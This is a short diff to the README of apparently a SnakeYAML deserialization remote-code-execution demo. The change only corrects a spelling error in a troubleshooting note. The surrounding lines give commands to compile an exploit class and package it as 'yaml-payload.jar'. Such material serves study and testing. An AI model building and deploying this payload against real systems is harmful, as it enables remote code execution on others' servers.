@@ -33,7 +33,7 @@ SnakeYAML deserialization fails and allows for RCE.
     ```
 
 ### Troubleshooting
-- If the java version of the vulnerble yaml parser doesn't match your java version then recompile:
+- If the java version of the vulnerable yaml parser doesn't match your java version then recompile:
     ```bash
     javac --release <version> src/artsploit/AwesomeScriptEngineFactory.java
     jar -cvf yaml-payload.jar -C src/ .
